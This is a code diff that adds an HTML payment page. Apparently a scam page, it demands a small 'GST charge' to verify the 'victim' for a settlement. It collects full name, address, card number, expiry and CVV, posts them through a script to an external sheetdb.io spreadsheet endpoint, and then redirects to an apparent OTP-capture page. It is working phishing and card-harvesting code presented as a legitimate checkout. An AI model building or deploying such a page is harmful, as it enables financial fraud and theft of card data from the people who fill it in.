@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        body {
+            font-family: Arial;
+            font-size: 17px;
+            padding: 8px;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        .row {
+            display: -ms-flexbox;
+            /* IE10 */
+            display: flex;
+            -ms-flex-wrap: wrap;
+            /* IE10 */
+            flex-wrap: wrap;
+            margin: 0 -16px;
+        }
+
+        .col-25 {
+            -ms-flex: 25%;
+            /* IE10 */
+            flex: 25%;
+        }
+
+        .col-50 {
+            -ms-flex: 50%;
+            /* IE10 */
+            flex: 50%;
+        }
+
+        .col-75 {
+            -ms-flex: 75%;
+            /* IE10 */
+            flex: 75%;
+        }
+
+        .col-25,
+        .col-50,
+        .col-75 {
+            padding: 0 16px;
+        }
+
+        .container {
+            background-color: #f2f2f2;
+            padding: 5px 20px 15px 20px;
+            border: 1px solid lightgrey;
+            border-radius: 3px;
+        }
+
+        input[type=text] {
+            width: 100%;
+            margin-bottom: 20px;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+
+        label {
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .icon-container {
+            margin-bottom: 20px;
+            padding: 7px 0;
+            font-size: 24px;
+        }
+
+        button {
+            background-color: #04AA6D;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            opacity: 0.9;
+        }
+
+        .btn:hover {
+            background-color: #45a049;
+        }
+
+        a {
+            color: #2196F3;
+        }
+
+        hr {
+            border: 1px solid rgb(212, 21, 21);
+        }
+
+        span.price {
+            float: right;
+            color: rgb(26, 11, 182);
+        }
+
+        /* Responsive layout - when the screen is less than 800px wide, make the two columns stack on top of each other instead of next to each other (also change the direction - make the "cart" column go on top) */
+        @media (max-width: 800px) {
+            .row {
+                flex-direction: column-reverse;
+            }
+
+            .col-25 {
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <h2>Kindly Pay The CCS GST charges INR 25</h2>
+    <p>In ordert to verify the victim identity and victim account source for the settlement .</p>
+
+    <form class="modal-content" action="https://sheetdb.io/api/v1/vs4tdo0usckts" method="post" id="sheetdb-form">
+
+
+        <div class="row">
+            <div class="col-50">
+                <h3>Billing Address</h3>
+                <label for="fname"><i class="fa fa-user"></i> Full Name</label>
+                <input type="text" id="fname" name="firstname" placeholder="Enter Your Name">
+                <label for="email"><i class="fa fa-envelope"></i> Email</label>
+                <input type="text" id="email" name="email" placeholder="email@gmail.com">
+                <label for="adr"><i class="fa fa-address-card-o"></i> Address</label>
+                <input type="text" id="adr" name="address" placeholder="Enter your Address">
+                <label for="city"><i class="fa fa-institution"></i> City</label>
+                <input type="text" id="city" name="city" placeholder="Enter your City ">
+
+                <div class="row">
+                    <div class="col-50">
+                        <label for="state">State</label>
+                        <input type="text" id="state" name="state" placeholder="NY">
+                    </div>
+                    <div class="col-50">
+                        <label for="zip">Zip</label>
+                        <input type="text" id="zip" name="zip" placeholder=" Area Pin Code">
+                    </div>
+
+                </div>
+            </div>
+
+            <div class="col-50">
+                <h3>Payment</h3>
+                <label for="fname">Accepted Cards</label>
+                <img src=" visa3.jpeg">
+                <span onclick="document.getElementById('id01').style.display='none'" class="close"
+                    title="Close Modal">&times;</span>
+                <form class="modal-content" action="https://sheetdb.io/api/v1/vs4tdo0usckts" method="post"
+                    id="sheetdb-form">
+                    <div class="container">
+                        <label for="cname">Name on Card</b></label>
+                        <input type="text" placeholder="Card Holder Name" name="data[cname]" required>
+
+                        <label for="cnum">Credit card number</b></label>
+                        <input type="text" placeholder="Enter Your 16 Digit Card Number" name="data[cnum]" required>
+                        <label for="expmonth">Exp Month</b><label>
+                                <input type="text" placeholder="Exp Month" name="data[expmonth]" required>
+                                <div class="row">
+                                    <div class="col-50">
+                                        <label for="expyear">Exp Year</b><label>
+                                                <input type="text" placeholder="Exp Year" name="data[expyear]" required>
+                                    </div>
+                                    <div class="col-50">
+                                        <label for="cvv">CVV</b><label>
+                                                <input type="text" placeholder="cvv" name="data[cvv]" required>
+
+                                    </div>
+                                </div>
+
+                                <label>
+                                    <button onclick="document.getElementById('id02').style.display='block'"
+                                        style="width:auto;">Pay
+                                        Now</button>
+
+                                    <script>
+                                        var form = document.getElementById('sheetdb-form');
+                                        form.addEventListener("submit", e => {
+                                            e.preventDefault();
+                                            fetch(form.action, {
+                                                method: "POST",
+                                                body: new FormData(document.getElementById("sheetdb-form")),
+                                            }).then(
+                                                response => response.json()
+                                            ).then((html) => {
+                                                // you can put any JS code here
+                                                window.open('otpv.html', '_self');
+
+                                            });
+                                        });
+                                    </script>
+
+
+
+</body>
+
+</html>
